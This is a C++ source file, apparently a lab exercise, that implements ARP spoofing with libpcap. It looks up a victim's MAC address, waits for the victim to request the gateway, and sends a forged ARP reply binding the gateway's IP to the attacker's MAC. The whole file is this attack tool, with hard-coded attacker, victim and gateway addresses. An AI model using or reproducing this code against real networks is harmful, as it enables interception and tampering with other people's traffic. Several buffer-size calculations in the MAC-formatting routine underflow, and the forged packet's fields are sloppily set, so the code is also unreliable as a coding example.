#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <netinet/in.h>
#include <net/if.h>
#include <netdb.h>

#define REQ_CNT 20

;
#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
    char padding[18];
};
#pragma pack(pop)

void convrt_mac(const char *data, char *cvrt_str, int sz )
{
     char buf[128] = {0x00,};
     char t_buf[8];
     char *stp = strtok( (char *)data , ":" );
     int temp=0;

     do
     {
          memset( t_buf, 0x0, sizeof(t_buf) );
          sscanf( stp, "%x", &temp );
          snprintf( t_buf, strlen(t_buf)-1, "%02X", temp );
          strncat( buf, t_buf, strlen(buf)-1 );
          strncat( buf, ":", strlen(buf)-1 );
     } while( (stp = strtok( NULL , ":" )) != NULL );

     buf[strlen(buf) -1] = '\0';
     strncpy( cvrt_str, buf, sz );
}


Mac get_mac(){
    int sockfd, cnt, req_cnt = REQ_CNT;
         char mac_adr[128] = {0x00,};
         struct sockaddr_in *sock;
         struct ifconf ifcnf_s;
         struct ifreq *ifr_s;

         sockfd = socket( PF_INET , SOCK_DGRAM , 0 );
         if( sockfd < 0 ) {
              perror( "socket()" );
              exit(-1);
         }

         memset( (void *)&ifcnf_s , 0x0 , sizeof(ifcnf_s) );
         ifcnf_s.ifc_len = sizeof(struct ifreq) * req_cnt;
         ifcnf_s.ifc_buf = static_cast<char*>(malloc(ifcnf_s.ifc_len));
         if( ioctl( sockfd, SIOCGIFCONF, (char *)&ifcnf_s ) < 0 ) {
              perror( "ioctl() - SIOCGIFCONF" );
              exit(-1);
         }

         if( ifcnf_s.ifc_len > (sizeof(struct ifreq) * req_cnt) ) {
              req_cnt = ifcnf_s.ifc_len;
              ifcnf_s.ifc_buf = static_cast<char*>(realloc( ifcnf_s.ifc_buf, req_cnt ));
         }

         ifr_s = ifcnf_s.ifc_req;
         for( cnt = 0 ; cnt < ifcnf_s.ifc_len ; cnt += sizeof(struct ifreq), ifr_s++ )
         {
              if( ioctl( sockfd, SIOCGIFFLAGS, ifr_s ) < 0 ) {
                   perror( "ioctl() - SIOCGIFFLAGS" );
                   exit(-1);
              }

              if( ifr_s->ifr_flags & IFF_LOOPBACK )
                   continue;

          //    sock = (struct sockaddr_in *)&ifr_s->ifr_addr;

              if( ioctl( sockfd, SIOCGIFHWADDR, ifr_s ) < 0 ) {
                   perror( "ioctl() - SIOCGIFHWADDR" );
                   exit(-1);
              }
              convrt_mac( ether_ntoa((struct ether_addr *)(ifr_s->ifr_hwaddr.sa_data)), mac_adr, sizeof(mac_adr) -1 );

 }
          return Mac(mac_adr);
}


pcap_t* my_pcap_open(char* dev){

    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        exit(-1);
     }
    return handle;
}

Mac send_arp_request(char* dev,Mac my_mac,Ip my_ip,Ip your_ip){

    pcap_t* handle = my_pcap_open(dev);

    EthArpPacket my_packet;

     my_packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
     my_packet.eth_.smac_ = my_mac;
     my_packet.eth_.type_ = htons(EthHdr::Arp);

     my_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
     my_packet.arp_.pro_ = htons(EthHdr::Ip4);
     my_packet.arp_.hln_ = Mac::SIZE;
     my_packet.arp_.pln_ = Ip::SIZE;
     my_packet.arp_.op_ = htons(ArpHdr::Request);
     my_packet.arp_.smac_ = my_mac;
     my_packet.arp_.sip_ = htonl(my_ip);
     my_packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
     my_packet.arp_.tip_ = htonl(your_ip);

     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&my_packet), sizeof(EthArpPacket));
     if (res != 0) {
         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
     }

     while (true) {
         struct pcap_pkthdr* header;
         const u_char* packet;

         int res = pcap_next_ex(handle,&header, &packet);

         if (res == 0) continue;

         if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
             printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
             continue;
         }

         EthArpPacket* _packet = (EthArpPacket*) packet;

         if ((ntohs(EthHdr::Arp) == _packet -> eth_.type_)  && ( ntohs(ArpHdr::Reply) == _packet -> arp_.op_ )
                  && ( ntohl(your_ip) == _packet ->arp_.sip_ )) {

             Mac victim_mac = _packet ->arp_.smac_ ;

             return victim_mac;
         }
     }
}

void find_victim(char* dev, Ip victim_ip, Ip target_ip){

    pcap_t* handle = my_pcap_open(dev);
    // find victim
    while (true) {
    struct pcap_pkthdr* header;
    const u_char* packet;

    int res = pcap_next_ex(handle,&header, &packet);

    if (res == 0) continue; // continue

    if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
        printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
        continue;
    }

    EthArpPacket* _packet = (EthArpPacket*) packet;

   if ((ntohs(EthHdr::Arp) == _packet ->eth_.type_)  && ( ntohs(ArpHdr::Request) == _packet -> arp_.op_ )
            && ( ntohl(target_ip) == _packet ->arp_.tip_) &&  ( ntohl(victim_ip) == _packet ->arp_.sip_) ){

        printf("find victim !!!!");
        break;
    }
  }
}


void send_infection_arp_reply(char* dev, Ip target_ip, Mac my_mac, Mac victim_mac){

    EthArpPacket my_packet;

    pcap_t* handle = my_pcap_open(dev);

    my_packet.eth_.dmac_ = victim_mac;
    my_packet.eth_.smac_ = my_mac;
    my_packet.eth_.type_ = htons(EthHdr::Arp);

    my_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    my_packet.arp_.pro_ = htons(EthHdr::Ip4);
    my_packet.arp_.hln_ = Mac::SIZE;
    my_packet.arp_.pln_ = Ip::SIZE;
    my_packet.arp_.op_ = htons(ArpHdr::Reply);
    my_packet.arp_.smac_ = my_mac;
    my_packet.arp_.sip_ = htonl(target_ip);
    my_packet.arp_.tmac_ = my_mac;
    my_packet.arp_.tip_ = htonl(target_ip);

     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&my_packet), sizeof(EthArpPacket));
     if (res != 0) {
         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
     }

     printf("infection success!!!!");

     pcap_close(handle);
}


void usage() {
    printf("syntax: ./send-arp-test <interface> <sender ip> <target ip>\n");
    printf("sample: ./send-arp-test eth0 192.168.219.103 192.168.219.1\n");
  //  printf("sample: ./send-arp-test eth0 192.168.219.103 192.168.0.1\n");
}

// victim 192.168.219.103
// attacker 192.168.219.148
// gateway 192.168.219.1

int main(int argc, char* argv[]) {
    if (argc != 4) {
		usage();
        printf("pcap start");
		return -1;
	}

    char* dev = argv[1]; // eth0

    Ip my_ip = Ip("192.168.219.148");
    Mac my_mac = get_mac();

    Ip victim_ip = Ip(argv[2]);
    Ip target_ip = Ip(argv[3]);

    Mac victim_mac = send_arp_request(dev, my_mac, my_ip, victim_ip);

    find_victim(dev, victim_ip, target_ip);
    send_infection_arp_reply(dev, target_ip, my_mac, victim_mac);

    return 0;
}

